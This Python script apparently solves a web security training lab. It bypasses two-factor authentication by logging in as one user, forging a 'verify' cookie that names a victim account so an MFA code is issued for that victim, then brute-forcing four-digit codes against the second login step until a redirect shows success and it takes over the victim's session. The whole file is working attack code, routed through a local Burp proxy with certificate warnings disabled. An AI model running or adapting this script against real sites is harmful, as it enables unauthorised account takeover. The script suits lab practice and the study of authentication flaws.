
# Generate mfa-code 0001->1999
# f = open('mfa.txt', 'w', encoding='utf-8')

# for i in range(1, 2000):
#     suf = str(i)
#     while (len(suf) < 4):
#         suf = '0' + suf
#     f.write(suf + '\n')

import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def generate_carlos_mfa(s, url):
    login_url = url + '/login'
    payload = {
        'username': 'wiener',
        'password': 'peter',
    }
    cookies = { 'verify': 'carlos' }
    r = s.post(login_url, data=payload, headers=headers, cookies=cookies)
    
    if r.status_code == 200:
        print('Generated carlos mfa-code')

def bruteforce_mfa(s, url):
    auth_url = url + '/login2'
    for num in range(1, 2000):
        mfa_code = str(num)
        while len(mfa_code) < 4:
            mfa_code = '0' + mfa_code

        payload = { 'mfa-code': mfa_code }
        cookies = { 'verify': 'carlos' }
        r = s.post(auth_url, data=payload, headers=headers, cookies=cookies, allow_redirects=False)
        
        print(mfa_code, r.status_code)

        if r.status_code == 302:
            print(f'Found Mfa-code=\'{mfa_code}\'')
            print('Bypass mfa-code....')
            return mfa_code
    return None

def login_carlos_acc(s, url, mfa_code):
    auth_url = url + '/login2'
    payload = { 'mfa-code': mfa_code }
    cookies = { 'verify': 'carlos' }
    r = s.post(auth_url, data=payload, headers=headers, cookies=cookies)
   
    if 'Log out' in r.text and r.status_code == 200:
        print('[+] Successful bypass 2FA')
        sys.exit()

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    generate_carlos_mfa(s, url)
    mfa_code = bruteforce_mfa(s, url)
    if mfa_code is None:
        print('[-] Failed to get mfa_code')
        sys.exit(-1)
    login_carlos_acc(s, url, mfa_code)
    

if __name__ == '__main__':
    main()